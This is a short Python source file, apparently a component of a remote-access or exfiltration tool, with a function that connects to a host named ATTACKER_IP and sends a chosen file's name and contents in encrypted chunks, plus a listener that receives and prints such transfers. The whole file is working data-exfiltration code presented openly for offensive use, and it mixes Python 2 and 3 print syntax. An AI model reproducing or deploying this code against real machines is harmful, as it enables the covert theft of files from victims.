import socket
from config import *
from crypto import *
import os

def send_file(file_path):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, FILE_TRANSFER_PORT))

    file = open(file_path, 'rb')
    s.send(encrypt(os.path.split(file_path)[1]))
    data = file.read(4096)
    while 1:
        s.send(encrypt(data))
        data = file.read(4096)
        if not data:
            break
    s.close()


def listen_for_file():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    print (host)
    s.bind((host, FILE_TRANSFER_PORT))
    s.listen(5)
    while 1:
        print ("in while loop")
        conn, addr = s.accept()
        print (addr)
        data = conn.recv(4096)
        print data
        while 1:
            data = conn.recv(4096)
            if not data:
                break
            print data
        # s.close()

